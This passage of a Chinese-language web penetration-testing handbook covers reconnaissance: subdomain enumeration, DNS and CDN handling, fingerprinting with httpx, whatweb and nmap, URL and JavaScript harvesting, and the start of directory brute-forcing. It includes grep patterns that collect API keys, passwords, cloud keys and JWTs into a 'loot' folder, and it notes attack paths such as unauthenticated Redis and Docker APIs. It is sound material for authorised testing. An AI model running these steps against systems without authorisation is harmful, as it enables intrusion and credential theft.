@@ -1,0 +1,1796 @@
+# Web 渗透测试流程与工具手册
+
+> 目标标识符统一占位：`example.com` / `TARGET_IP` / `OAST_DOMAIN`
+> 所有产出落盘到 `RESULT_DIR`，一条漏洞一个目录。
+
+---
+
+## 目录
+
+- [零、开工前：环境与目录规范](#零开工前环境与目录规范)
+- [一、工具清单与安装](#一工具清单与安装)
+- [二、阶段 1：信息收集](#二阶段-1信息收集)
+- [三、阶段 2：存活探测、DNS 解析与指纹识别](#三阶段-2存活探测dns-解析与指纹识别)
+- [四、阶段 3：URL 与接口面收集](#四阶段-3url-与接口面收集)
+- [五、阶段 4：目录与接口爆破](#五阶段-4目录与接口爆破)
+- [六、阶段 5：漏洞探测](#六阶段-5漏洞探测)
+- [七、阶段 6：权限获取与横向移动](#七阶段-6权限获取与横向移动)
+- [八、阶段 7：后渗透纪律与报告](#八阶段-7后渗透纪律与报告)
+- [九、全流程一页速查](#九全流程一页速查)
+- [十、工具速查表](#十工具速查表)
+- [十一、Kali 预装情况说明](#十一kali-预装情况说明)
+- [十二、常见错误清单](#十二常见错误清单)
+
+---
+
+## 零、开工前：环境与目录规范
+
+```bash
+export TARGET_DOMAIN="example.com"
+export RESULT_DIR="$HOME/pentest/example_$(date +%Y%m%d)"
+mkdir -p $RESULT_DIR/{recon,scan,vuln,loot,evidence}
+export PATH=$PATH:$HOME/go/bin          # Go 工具默认装到 ~/go/bin，不在 PATH 里
+```
+
+目录职责：
+
+| 目录 | 存什么 |
+|---|---|
+| `recon/` | 子域、存活、指纹、URL、JS、参数 |
+| `scan/` | 端口扫描、目录爆破结果 |
+| `vuln/` | 漏洞验证的请求包、payload、OAST 记录 |
+| `loot/` | 拿到的凭据、数据、源码 |
+| `evidence/` | 截图、日志、时间线 |
+
+**先固化 scope**：授权域名、IP 段、时间窗、禁用动作（DoS / 删数据 / 社工内部人员）写进 `$RESULT_DIR/scope.txt`，后续所有扫描器读这个当白名单。
+
+---
+
+## 一、工具清单与安装
+
+### 1.1 Kali 默认自带（开箱即用）
+
+```
+nmap  whatweb  sqlmap  ffuf  gobuster  dirb  wafw00f  feroxbuster
+john  hashcat  proxychains4  burpsuite(Community)  seclists
+dnsutils  netcat  socat  hydra  medusa
+```
+
+`amass` 在较新版本里被移出默认安装，`which amass` 没有就单独装。
+
+### 1.2 需要自己装
+
+Go 系：`subfinder` `httpx` `katana` `dnsx` `interactsh-client` `gau` `assetfinder` `waybackurls` `anew` `dalfox` `puredns` `fscan` `chisel`
+
+其他：`dirsearch`（pip）`xsstrike`（pip）`neoreg`（Python）`linpeas`/`winPEAS`（下载脚本）`jq`（apt）
+
+### 1.3 安装
+
+**方式 A：GitHub Release 的 .deb 包（最稳，推荐）**
+
+不编译、不配 PATH、自动装到 `/usr/bin`。
+
+```bash
+wget https://github.com/projectdiscovery/subfinder/releases/latest/download/subfinder_2.x.x_linux_amd64.deb
+sudo dpkg -i subfinder_*.deb
+```
+
+**方式 B：go install**
+
+```bash
+go version                      # 确认 go1.21+
+echo 'export PATH=$PATH:$HOME/go/bin' >> ~/.zshrc && source ~/.zshrc
+
+go install -v github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest
+go install -v github.com/projectdiscovery/httpx/cmd/httpx@latest
+go install -v github.com/projectdiscovery/katana/cmd/katana@latest
+go install -v github.com/projectdiscovery/dnsx/cmd/dnsx@latest
+go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
+go install -v github.com/lc/gau/v2/cmd/gau@latest
+go install -v github.com/tomnomnom/assetfinder@latest
+go install -v github.com/tomnomnom/waybackurls@latest
+go install -v github.com/tomnomnom/anew@latest
+go install -v github.com/hahwul/dalfox/v2@latest
+go install -v github.com/d3mondev/puredns/v2@latest
+go install -v github.com/shadow1ng/fscan@latest
+go install -v github.com/jpillora/chisel@latest
+```
+
+> 坑：不配 PATH 的话，装完一律 `command not found`。
+
+**方式 C：Python 类（新版 Kali 有 PEP 668 限制）**
+
+```bash
+sudo apt install -y pipx jq
+pipx install dirsearch && pipx install xsstrike && pipx ensurepath
+# 直接 pip install 会报 externally-managed-environment
+```
+
+**其他**
+
+```bash
+sudo apt install -y nmap whatweb sqlmap ffuf gobuster dirb wafw00f feroxbuster seclists golang-go pipx jq
+mkdir -p ~/tools && cd ~/tools
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh -o linpeas.sh
+curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/winPEASx64.exe -o winPEASx64.exe
+chmod +x linpeas.sh
+```
+
+**非 Kali 环境**
+
+- Windows：`wsl --install -d kali-linux` 然后 `sudo apt install kali-linux-headless`
+- Docker：`docker run -it kalilinux/kali-rolling` 然后 `apt install kali-tools-web kali-tools-information-gathering`
+- Mac：Go 系大部分能编译（`_linux_amd64` → `_darwin_arm64`），部分依赖 Linux 特性的隧道工具缺功能
+
+---
+
+## 二、阶段 1：信息收集
+
+### 2.1 子域枚举
+
+**是什么**：`example.com` 是主域，`mail.example.com` / `admin.example.com` / `oa.example.com` 都是子域。枚举就是找出某个主域下所有存在的子域名。
+
+**有什么用**：
+
+- 主站通常有 WAF、有专业运维、难打；**子域往往由不同团队维护，防护参差不齐**（`test` / `dev` / `uat` / `jenkins` / `gitlab` 是重灾区）
+- 确认资产归属：知道这家公司到底有多少机器在公网
+- 绕 CDN：主站挂 Cloudflare，但 `ftp.` / `mail.` / `vpn.` 常直连真实 IP
+- 横向跳板：子域之间常共用同一套 SSO / 数据库 / 网段
+
+#### subfinder —— 被动子域枚举
+
+**用途**：聚合几十个公开数据源（证书透明度日志、VirusTotal、Shodan、DNSdumpster 等）。**不碰目标服务器一个包**，不触发 WAF、不进目标日志。
+
+```bash
+subfinder -d $TARGET_DOMAIN -all -silent -o $RESULT_DIR/recon/subs_subfinder.txt
+wc -l $RESULT_DIR/recon/subs_subfinder.txt
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-d` | 目标主域（**不带 www**） |
+| `-all` | 用全部数据源（默认只用几个快的，`-all` 慢几倍但多 30% 结果） |
+| `-silent` | 只输出域名，不打印日志（**管道里必须加**） |
+| `-o` | 写文件 |
+| `-recursive` | 从找到的子域再往下挖一级 |
+| `-timeout 30` | 单源超时 |
+| `-v` | 显示每个源的实际返回数，判断哪个源没配 key |
+
+**结果**：
+
+```
+mail.example.com
+oa.example.com
+git.example.com
+test.example.com
+```
+
+**判读信号**：出现 `api` `admin` `test` `dev` `uat` `oa` `jenkins` `gitlab` `vpn` 就是后续重点。
+
+**API Key 配置**：`~/.config/subfinder/provider-config.yaml`。不配也能跑，结果少。
+
+#### assetfinder —— 极速被动枚举
+
+只查几个免费源（crt.sh、HackerTarget、Wayback），秒级返回。
+
+```bash
+assetfinder --subs-only $TARGET_DOMAIN > $RESULT_DIR/recon/subs_assetfinder.txt
+```
+
+`--subs-only` 只输出子域（不加会把关联域名也吐出来）。
+
+#### amass —— 数据源最全
+
+```bash
+# 被动模式（不发包）
+amass enum -passive -d $TARGET_DOMAIN -o $RESULT_DIR/recon/subs_amass.txt -timeout 30
+
+# 主动模式（会做 DNS 解析、证书抓取，慢很多）
+amass enum -active -d $TARGET_DOMAIN -brute \
+      -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
+
+# ASN 反查：查这家公司所有 IP 段里有 DNS 记录的域名
+amass intel -asn AS12345 -whois
+
+# 按组织名反查
+amass intel -org "Example Inc"
+```
+
+#### puredns —— 字典爆破 + 泛解析过滤
+
+**用途**：拿字典主动猜子域。核心价值是**自动识别并过滤泛解析**——如果 `*.example.com` 都解析到同一 IP，普通爆破会返回几千条假数据。
+
+```bash
+wget https://raw.githubusercontent.com/trickest/resolvers/main/resolvers.txt \
+     -O $RESULT_DIR/recon/resolvers.txt
+
+puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+    $TARGET_DOMAIN \
+    -r $RESULT_DIR/recon/resolvers.txt \
+    -w $RESULT_DIR/recon/subs_brute.txt
+
+puredns resolve $RESULT_DIR/recon/subs_all.txt \
+    -r $RESULT_DIR/recon/resolvers.txt --write $RESULT_DIR/recon/subs_final.txt
+```
+
+- `bruteforce <字典> <域>` 固定的三参数结构
+- `-r` 用哪些 DNS 服务器解析
+- `resolve` 子命令对已有列表做解析 + 通配符过滤
+
+**手工验证泛解析**：
+
+```bash
+dig random123456.example.com +short
+# 有输出 → 存在泛解析 → 爆破结果必须过滤
+```
+
+#### 字典位置
+
+```
+/usr/share/seclists/Discovery/DNS/
+├── subdomains-top1million-5000.txt      # 5000 条，快速
+├── subdomains-top1million-20000.txt     # 2 万条，均衡 ← 推荐
+└── subdomains-top1million-110000.txt    # 11 万条，全面
+```
+
+#### 证书 SAN 反查
+
+```bash
+echo | openssl s_client -connect www.example.com:443 2>/dev/null | \
+  openssl x509 -noout -text | grep -A1 "Subject Alternative Name"
+```
+
+#### 在线数据源
+
+- `https://crt.sh/?q=%25.example.com` —— 证书透明度日志，最核心的免费源
+- `https://dns.bufferover.run/dns?q=.example.com`
+- `https://securitytrails.com` / `https://dnsdumpster.com` —— 历史 DNS
+- `https://bgp.he.net` —— ASN 与 IP 段
+
+### 2.2 阶段 1 汇总流水线
+
+```bash
+# 1) 被动收集，三源合并去重
+subfinder -d $TARGET_DOMAIN -all -silent | anew $RESULT_DIR/recon/subs_all.txt
+assetfinder --subs-only $TARGET_DOMAIN       | anew $RESULT_DIR/recon/subs_all.txt
+amass enum -passive -d $TARGET_DOMAIN -silent | anew $RESULT_DIR/recon/subs_all.txt
+
+# 2) 主动爆破补充
+puredns bruteforce /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
+    $TARGET_DOMAIN -r $RESULT_DIR/recon/resolvers.txt --write $RESULT_DIR/recon/brute.txt
+cat $RESULT_DIR/recon/brute.txt | anew $RESULT_DIR/recon/subs_all.txt
+
+# 3) 落定
+wc -l $RESULT_DIR/recon/subs_all.txt
+```
+
+> **anew** —— 增量去重：`cat new.txt | anew all.txt`，只追加文件里还没有的行，同时把新增行输出到 stdout。做流水线必备。
+
+---
+
+## 三、阶段 2：存活探测、DNS 解析与指纹识别
+
+### 3.1 域名 → IP：DNS 解析
+
+子域枚举给的是**域名**，nmap 要的是 **IP**，中间这一步是 **DNS 解析**。必须先落盘成 IP 列表。
+
+#### 路径 1：dnsx 批量解析（推荐）
+
+```bash
+# 只取 IP
+dnsx -l $RESULT_DIR/recon/subs_all.txt -a -resp-only -silent | sort -u > $RESULT_DIR/recon/ips.txt
+
+# 保留「域名 ↔ IP」映射（更实用，扫完知道 IP 是谁的）
+dnsx -l $RESULT_DIR/recon/subs_all.txt -a -resp -silent -o $RESULT_DIR/recon/domain_ip.txt
+awk '{print $2}' $RESULT_DIR/recon/domain_ip.txt | tr -d '[]' | sort -u > $RESULT_DIR/recon/ips.txt
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-a` | 查 A 记录（IPv4）；`-aaaa` 查 IPv6 |
+| `-resp-only` | **只输出响应值**（IP 本身），不输出 `域名 [IP]` |
+| `-resp` | 输出 `域名 [IP]` 格式 |
+| `-cname` | 查 CNAME（判断 CDN） |
+| `-ptr` | 反向解析 |
+| `-silent` | 只输出结果 |
+
+`domain_ip.txt` 输出：
+
+```
+oa.example.com [1.2.3.4]
+git.example.com [5.6.7.8]
+mail.example.com [1.2.3.4]
+```
+
+#### 路径 2：httpx 顺带输出
+
+```bash
+httpx -l $RESULT_DIR/recon/subs_all.txt -sc -title -tech-detect -ip -cname -cdn \
+      -silent -o $RESULT_DIR/recon/alive.txt
+
+# 提取 IP
+grep -oE '\[[0-9]{1,3}(\.[0-9]{1,3}){3}\]' $RESULT_DIR/recon/alive.txt | tr -d '[]' | sort -u > $RESULT_DIR/recon/ips.txt
+```
+
+**不要用 `cut -d' ' -f5` 切字段**——加了 `-title`（标题含空格）后字段位置会漂移，必翻车。用正则或 JSON。
+
+**更稳的做法（JSON + jq）**：
+
+```bash
+httpx -l $RESULT_DIR/recon/subs_all.txt -ip -json -silent -o $RESULT_DIR/recon/alive.jsonl
+jq -r '.host + " " + .a[]?' $RESULT_DIR/recon/alive.jsonl 2>/dev/null | sort -u > $RESULT_DIR/recon/domain_ip.txt
+jq -r '.a[]?' $RESULT_DIR/recon/alive.jsonl 2>/dev/null | sort -u > $RESULT_DIR/recon/ips.txt
+```
+
+#### 路径 3：dig / host 单个查
+
+```bash
+dig +short example.com                    # 简洁，只给 IP
+dig +short A oa.example.com
+dig oa.example.com A +noall +answer       # 带 TTL
+dig CNAME git.example.com +short          # 看是否 CNAME 到 CDN
+host oa.example.com
+host -t A oa.example.com
+dig -x 1.2.3.4 +short                     # 反查：IP → 域名
+
+# 批量手工
+while read d; do echo "$d $(dig +short A $d | head -1)"; done < $RESULT_DIR/recon/subs_all.txt \
+  > $RESULT_DIR/recon/domain_ip.txt
+```
+
+#### 路径 4：nmap 直接吃域名（不推荐）
+
+```bash
+nmap -sV -p- example.com            # 能跑，nmap 内部先解析
+sudo nmap -sS -p- -iL subs.txt      # 也能吃域名列表
+```
+
+**为什么不用**：无法控制解析结果；输出记域名，事后要对回 IP；批量几千个域名时 nmap 的 DNS 解析慢且易失败。单个目标、无 CDN 时可以图省事。
+
+### 3.2 关键陷阱：解析出来的是 CDN 的 IP
+
+`oa.example.com` 解析到 `104.21.x.x`，那是 Cloudflare 的 IP，**不是目标真实服务器**。
+
+**后果**：
+
+1. nmap 扫出的是 CDN 边缘节点，端口信息全假（只有 80/443）
+2. **扫 CDN 的 IP 会被判定为攻击，源站收到告警，你的 IP 被封**
+
+**识别方法**：
+
+```bash
+# 1) CNAME 判断
+dig +short CNAME oa.example.com
+# 返回 oa.example.com.cdn.cloudflare.net → CDN
+# 返回空 → 可能直连
+
+# 2) httpx 自动标记
+httpx -l $RESULT_DIR/recon/subs_all.txt -cdn -silent
+# 输出: https://oa.example.com [CDN]
+
+# 3) IP 归属
+whois 1.2.3.4 | grep -iE "(orgname|netname|descr)"
+# Cloudflare, Inc. / Akamai / 阿里云CDN → CDN
+
+# 4) 多个 A 记录（CDN 通常有多个）
+dig +short A oa.example.com | wc -l
+```
+
+**筛出直连 IP**：
+
+```bash
+for d in $(cat $RESULT_DIR/recon/subs_all.txt); do
+  cname=$(dig +short CNAME $d)
+  if [ -z "$cname" ]; then
+    ip=$(dig +short A $d | head -1)
+    [ -n "$ip" ] && echo "$d $ip"
+  fi
+done > $RESULT_DIR/recon/direct_ip.txt
+```
+
+**CDN 后面的目标怎么找真实 IP**：
+
+1. 历史 DNS 记录（securitytrails、dnsdumpster）
+2. 证书 hash 反查（Censys / Shodan）
+3. 邮件头：发订阅邮件看 SMTP `Received` 头
+4. 子域里没挂 CDN 的那几个（`ftp.` `mail.` `vpn.` 常直连）
+5. 直接打 IP 验证：`curl -H "Host: example.com" http://REAL_IP`
+
+### 3.3 httpx —— 批量 HTTP 探测（最重要的筛子）
+
+**用途**：把几千个子域挨个 HTTP 请求一遍，输出状态码、标题、技术栈、CDN 标记、favicon hash。**把 5000 个候选变成 50 个可打的**。
+
+```bash
+httpx -l $RESULT_DIR/recon/subs_all.txt \
+      -sc -title -tech-detect -favicon -cdn -ip -cname \
+      -threads 100 -timeout 10 \
+      -o $RESULT_DIR/recon/alive.txt \
+      -json -o $RESULT_DIR/recon/alive.json
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-l` / `-u` | 输入文件 / 单目标（也能管道 `cat subs.txt \| httpx`） |
+| `-sc` | **状态码，最重要的字段** |
+| `-title` | 网页标题，一眼识别系统类型 |
+| `-tech-detect` | 技术栈（Wappalyzer 规则库） |
+| `-favicon` | favicon 的 mmh3 hash，同系统 hash 相同 |
+| `-cdn` | 标记是否在 CDN 后面 |
+| `-ip` / `-cname` | 输出 IP / CNAME |
+| `-threads 100` | 并发 |
+| `-timeout 10` | 超时 |
+| `-json` | JSON 输出（做数据处理用） |
+| `-mc 200,301,302,403` | 只保留这些状态码 |
+| `-fc 404` | 过滤 404 |
+| `-follow-redirects` | 跟随跳转 |
+| `-H "Cookie: xxx"` | 自定义头 |
+| `-path /admin` | 对每个目标追加路径探测 |
+
+**结果判读**：
+
+```
+https://oa.example.com   [200] [泛微e-cology OA] [Java,nginx] [1.2.3.4]
+https://git.example.com  [401] [GitLab] [Ruby,nginx] [cdn.x.net]
+https://test.example.com [403] [Nginx] [1.2.3.4]
+```
+
+- **200** → 直接进去看
+- **401/403** → 存在但有访问控制，是绕过方向
+- **500** → 代码有问题，可能有异常点
+- **标题带系统名** → 直接去查该系统已知漏洞
+- **标记了 `[CDN]`** → 要绕 CDN 才能打源站
+
+**vhost 探测**（同一 IP 上不同 Host 头返回不同站点，容易漏资产）：
+
+```bash
+ffuf -u http://TARGET_IP -H "Host: FUZZ.example.com" -w subdomains.txt -fs 0
+```
+
+### 3.4 whatweb —— 单目标精细指纹
+
+**用途**：httpx 给概览，whatweb 为单个目标发多条探测请求，识别到**版本号级别**，并列匹配依据。
+
+```bash
+whatweb -a 3 https://oa.example.com
+whatweb -a 3 --log-verbose=$RESULT_DIR/recon/whatweb_oa.txt https://oa.example.com
+whatweb --input-file=$RESULT_DIR/recon/alive_urls.txt --log-json=$RESULT_DIR/recon/whatweb.json
+```
+
+- `-a 1` 最温和（1 个请求）／`-a 3` 均衡／`-a 4` 最激进
+- `-v` 详细，显示每条匹配规则的命中原因
+- `--log-json` 结构化输出
+
+**结果**：
+
+```
+https://oa.example.com [200 OK] Apache[2.4.52], Country[CHINA][CN],
+  HTML5, IP[1.2.3.4], JQuery, nginx[1.18.0], PHP[7.4.3], Title[泛微OA]
+```
+
+看到 `PHP[7.4.3]` 这种精确版本，直接去搜该版本已知漏洞。
+
+### 3.5 nmap —— 端口与服务识别
+
+**用途**：httpx 只探 HTTP，nmap 找**所有开放端口**和服务版本。很多资产的价值在非 Web 端口。
+
+```bash
+# 快速全端口
+sudo nmap -sS -p- --min-rate 2000 -T4 -iL $RESULT_DIR/recon/ips_direct.txt -oA $RESULT_DIR/scan/nmap_all
+
+# 对开放端口做版本识别 + 默认脚本
+sudo nmap -sV -sC -p 22,80,443,3306,6379,8080,9200 -oA $RESULT_DIR/scan/nmap_svc TARGET_IP
+
+# 查已知 CVE
+sudo nmap -sV --script vulners -p 80,443 TARGET_IP
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-sS` | SYN 半开扫描（快，需 root） |
+| `-sT` | 全连接（不需 root，慢；走代理时只能用这个） |
+| `-p-` | 全 65535 端口 |
+| `--min-rate 2000` | 每秒至少 2000 包（加速，可能触发 IDS） |
+| `-T4` | 时序模板，T0–T5 从慢到快 |
+| `-sV` | 服务版本探测 |
+| `-sC` | 默认脚本集 |
+| `-O` | 操作系统识别 |
+| `-oA` | 同时输出 `.nmap` `.xml` `.gnmap` 三种格式 |
+| `--script` | 指定脚本：`http-title` `vulners` `smb-vuln-*` |
+| `-iL` | 从文件读目标列表 |
+
+**结果判读**：
+
+```
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.4 (protocol 2.0)     ← 版本老，查 CVE
+6379/tcp open  redis   Redis key-value store          ← Redis 未授权！直接打
+9200/tcp open  http    Elasticsearch REST API 7.10.0  ← 未授权读全部索引
+```
+
+**非 Web 端口价值表**：
+
+| 端口 | 服务 | 常见问题 |
+|---|---|---|
+| 22 | SSH | 弱口令、密钥复用 |
+| 445 | SMB | 永恒之蓝、匿名共享 |
+| 1433 | MSSQL | 弱口令、xp_cmdshell |
+| 3306 | MySQL | 弱口令、外连 |
+| 5432 | PostgreSQL | 弱口令 |
+| 6379 | Redis | 未授权、写 SSH key / 计划任务 |
+| 27017 | MongoDB | 未授权读全部数据 |
+| 9200 | Elasticsearch | 未授权读全部索引 |
+| 2375 | Docker API | 未授权 = 起容器拿 root |
+| 11211 | Memcached | 未授权、放大攻击 |
+
+### 3.6 wafw00f —— WAF 识别
+
+```bash
+wafw00f https://example.com
+wafw00f -l                            # 列出所有能识别的 WAF
+wafw00f -a https://example.com        # 测试所有特征
+wafw00f -i $RESULT_DIR/recon/alive_urls.txt -o $RESULT_DIR/recon/waf.txt
+```
+
+结果：`[*] The site is behind Cloudflare (Cloudflare Inc.) WAF.`
+
+识别到 Cloudflare → 后面要绕 CDN 找源站；识别到安全狗/云锁，绕过思路又不同。
+
+### 3.7 favicon hash —— 找同类资产
+
+同一套系统的 favicon hash 相同，拿 hash 去 Fofa/Shodan/Quake 搜，能找出全网用同一套系统的站点。
+
+```bash
+httpx -u https://oa.example.com -favicon -silent
+# 输出: [favicon: -1234567890]
+```
+
+Fofa 搜 `icon_hash="-1234567890"`。
+
+### 3.8 阶段 2 汇总
+
+```bash
+# 1) DNS 解析
+dnsx -l $RESULT_DIR/recon/subs_all.txt -a -resp -silent -o $RESULT_DIR/recon/domain_ip.txt
+
+# 2) 批量 HTTP 探测
+httpx -l $RESULT_DIR/recon/subs_all.txt -sc -title -tech-detect -favicon -cdn -ip \
+      -threads 100 -o $RESULT_DIR/recon/alive.txt
+
+# 3) 抽活着的 URL
+grep -oE 'https?://[^ ]+' $RESULT_DIR/recon/alive.txt | sort -u > $RESULT_DIR/recon/alive_urls.txt
+
+# 4) 过滤 CDN，得到可扫的 IP
+grep -v '\[CDN\]' $RESULT_DIR/recon/alive.txt | \
+  grep -oE '\[[0-9]{1,3}(\.[0-9]{1,3}){3}\]' | tr -d '[]' | sort -u > $RESULT_DIR/recon/ips_direct.txt
+echo "全部: $(wc -l < $RESULT_DIR/recon/ips.txt)  直连: $(wc -l < $RESULT_DIR/recon/ips_direct.txt)"
+
+# 5) nmap 只扫直连 IP
+sudo nmap -sS -p- --min-rate 2000 -T4 -iL $RESULT_DIR/recon/ips_direct.txt -oA $RESULT_DIR/scan/nmap_all
+
+# 6) 单目标精细指纹
+head -20 $RESULT_DIR/recon/alive_urls.txt | while read u; do
+  echo "=== $u"; whatweb -a 3 "$u" 2>/dev/null
+done | tee $RESULT_DIR/recon/whatweb_all.txt
+
+# 7) WAF 识别
+wafw00f -i $RESULT_DIR/recon/alive_urls.txt -o $RESULT_DIR/recon/waf.txt
+```
+
+**数据流**：
+
+```
+域名列表 (subfinder / amass / puredns)
+    │
+    ├──► dnsx -a          → IP 列表
+    ├──► dnsx -cname      → CNAME（判断 CDN）
+    ├──► httpx -sc -title → 活着的 HTTP 服务（-ip 顺带给 IP）
+    │
+    ▼
+IP 列表（过滤掉 CDN 的）
+    │
+    ▼
+nmap -sS -p-              → 开放端口 + 服务版本
+    │
+    ▼
+按服务分流：80/443 → Web 流程（阶段 3–5）；其余端口走未授权/弱口令
+```
+
+---
+
+## 四、阶段 3：URL 与接口面收集
+
+**是什么**：网站除了首页和明面链接，还有大量隐藏接口、老版本 API、废弃页面。这一步把目标所有能访问的 URL 和参数全捞出来。
+
+**有什么用**：
+
+- **老接口是重灾区**：`/api/v1/` 还在跑但 v3 已修洞，v1 没修
+- 拿到参数名才能测注入（没有 `?id=1` 就无从下手）
+- 找到隐藏后台、上传点、调试页、`/actuator/env`、`/.git/config`
+- **JS 文件是金矿**：硬编码 API 密钥、内网地址、管理员路由
+
+### 4.1 gau —— 历史 URL 收集
+
+从 Wayback Machine、Common Crawl、AlienVault OTX、URLScan 拉该域**历史上被记录过的所有 URL**。数据源公开，不发包给目标。
+
+```bash
+gau --threads 5 --subs $TARGET_DOMAIN > $RESULT_DIR/recon/urls_gau.txt
+gau --subs --blacklist png,jpg,gif,css,woff,svg,ttf $TARGET_DOMAIN > $RESULT_DIR/recon/urls_gau.txt
+```
+
+- `--subs` 包含子域
+- `--threads` 并发
+- `--blacklist` 排除无用后缀，结果更干净
+
+### 4.2 waybackurls
+
+```bash
+waybackurls $TARGET_DOMAIN > $RESULT_DIR/recon/urls_wayback.txt
+echo $TARGET_DOMAIN | waybackurls
+```
+
+### 4.3 katana —— 主动爬虫（会执行 JS）
+
+**用途**：gau 只能拿历史记录，katana 真的去爬当前网站，**用无头浏览器执行 JavaScript**，能从 SPA（Vue/React）抓出前端动态生成的接口。现代网站必须用。
+
+```bash
+katana -u https://example.com \
+       -d 3 -jc -aff -kf all -fx \
+       -c 20 -p 10 -rl 150 \
+       -o $RESULT_DIR/recon/katana.txt \
+       -jsonl -o $RESULT_DIR/recon/katana.jsonl
+```
+
+| 参数 | 含义 |
+|---|---|
+| `-u` / `-list` | 起始 URL / 批量文件 |
+| `-d 3` | 爬取深度 |
+| `-jc` | **解析 JS 里的路径（最关键）** |
+| `-jsl` | 解析 JS 具体内容并保存（看 API 定义） |
+| `-aff` | 自动填充表单（能爬出 POST 接口） |
+| `-kf all` | 保留所有文件类型 |
+| `-fx` | 跟随表单提交后的重定向 |
+| `-c 20` / `-p 10` | 并发数 / 每目标并发 |
+| `-rl 150` | 全局每秒请求上限 |
+| `-H "Cookie: xxx"` | 带登录态爬 |
+| `-headless` | 无头浏览器模式（默认） |
+| `-fs rdn` | 字段范围：`rdn` 根域 / `fqdn` 全域名 |
+
+**爬登录后的内容**：先在浏览器登录，从 DevTools 复制 Cookie。
+
+```bash
+katana -u https://example.com/dashboard -H "Cookie: PHPSESSID=abc123; token=xyz" -jc -d 3
+```
+
+### 4.4 数据清洗（实操里最耗时间）
+
+```bash
+# 合并去重
+cat $RESULT_DIR/recon/urls_*.txt $RESULT_DIR/recon/katana.txt | sort -u > $RESULT_DIR/recon/urls_all.txt
+
+# 只留本域（历史数据会混进别人的域名）
+grep -E "example\.com" $RESULT_DIR/recon/urls_all.txt > tmp && mv tmp $RESULT_DIR/recon/urls_all.txt
+
+# 排除静态资源
+grep -viE "\.(png|jpg|jpeg|gif|css|woff|woff2|ttf|svg|ico|mp4|pdf)(\?|$)" \
+    $RESULT_DIR/recon/urls_all.txt > $RESULT_DIR/recon/urls_clean.txt
+
+# 只留有参数的（带参数才能测注入/越权）
+grep "=" $RESULT_DIR/recon/urls_clean.txt | sort -u > $RESULT_DIR/recon/urls_params.txt
+
+# 提取参数名
+grep -oE "[?&][a-zA-Z0-9_]+=" $RESULT_DIR/recon/urls_params.txt | \
+    sed 's/^[?&]//;s/=$//' | sort -u > $RESULT_DIR/recon/params.txt
+
+wc -l $RESULT_DIR/recon/urls_all.txt $RESULT_DIR/recon/urls_clean.txt \
+      $RESULT_DIR/recon/urls_params.txt $RESULT_DIR/recon/params.txt
+```
+
+### 4.5 JS 文件挖掘（现代网站主攻面）
+
+```bash
+# 1) 拉所有 JS
+grep -E "\.js(\?|$)" $RESULT_DIR/recon/urls_all.txt | sort -u > $RESULT_DIR/recon/js_files.txt
+mkdir -p $RESULT_DIR/recon/js
+while read u; do
+  fn=$(echo "$u" | md5sum | cut -c1-8).js
+  curl -s -m 10 "$u" -o "$RESULT_DIR/recon/js/$fn"
+done < $RESULT_DIR/recon/js_files.txt
+cat $RESULT_DIR/recon/js/*.js > $RESULT_DIR/recon/js_all.txt
+
+# 2) 抠接口路径
+grep -oE '"(/?(api|v[0-9]|rest|graphql)[a-zA-Z0-9_/.-]*)"' $RESULT_DIR/recon/js_all.txt | \
+    tr -d '"' | sort -u > $RESULT_DIR/recon/js_endpoints.txt
+
+# 3) 抠密钥/令牌
+grep -oiE '(api[_-]?key|access[_-]?key|secret|token|password|passwd|pwd)["'"'"']?\s*[:=]\s*["'"'"'][^"'"'"']{6,}' \
+    $RESULT_DIR/recon/js_all.txt | sort -u > $RESULT_DIR/loot/js_secrets.txt
+
+# 4) 云厂商 AK
+grep -oE '(AKIA[A-Z0-9]{16}|LTAI[A-Za-z0-9]{12,20}|AKID[A-Za-z0-9]{13,20})' \
+    $RESULT_DIR/recon/js_all.txt | sort -u
+
+# 5) JWT
+grep -oE 'eyJ[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}\.[A-Za-z0-9_-]{10,}' \
+    $RESULT_DIR/recon/js_all.txt | sort -u
+
+# 6) 内网域名 / IP
+grep -oE 'https?://[a-zA-Z0-9.-]+\.(internal|local|corp|lan)[a-zA-Z0-9/_-]*' \
+    $RESULT_DIR/recon/js_all.txt | sort -u
+grep -oE '(10|172\.(1[6-9]|2[0-9]|3[01])|192\.168)\.[0-9]{1,3}\.[0-9]{1,3}' \
+    $RESULT_DIR/recon/js_all.txt | sort -u
+
+# 7) sourcemap
+grep -oE '[a-zA-Z0-9_/.-]+\.js\.map' $RESULT_DIR/recon/js_all.txt | sort -u
+```
+
+**sourcemap 还原**（有 `.map` 就等于有源码）：
+
+```bash
+curl -s https://example.com/static/app.js.map | \
+    python3 -c "import json,sys; d=json.load(sys.stdin); [print('//',s,'\n',c) for s,c in zip(d['sources'],d['sourcesContent'])]" \
+    > $RESULT_DIR/loot/sourcemap_dump.txt
+
+pipx install unmap
+unmap https://example.com/static/app.js.map -o $RESULT_DIR/loot/src/
+```
+
+---
+
+## 五、阶段 4：目录与接口爆破
+
+**是什么**：程序写了 `/admin/`、`/backup.zip`、`/.git/`，但页面上不显示。爆破就是拿字典逐个请求，根据响应差异判断哪些路径存在。
+
+**有什么用**：找未授权后台、源码泄露、数据库备份、配置残留。
+
+### 5.1 ffuf —— 主力爆破工具
+
+`FUZZ` 是占位符，出现在哪就替换哪。
+
+```bash
+ffuf -u https://example.com/FUZZ \
+     -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt \
+     -t 50 -rate 200 \
+     -mc 200,204,301,302,401,403,405 \
+     -ac \
+     -o $RESULT_DIR/scan/ffuf_dir.json -of json
+```
+
+**完整参数表**：
+
+| 参数 | 含义 | 实战意义 |
+|---|---|---|
+| `-u` | 目标 URL，含 `FUZZ` | 可 fuzz 路径/子域/参数值/Header |
+| `-w` | 字典，`字典:关键字` | 多字典组合：`-w d1:W1 -w d2:W2` |
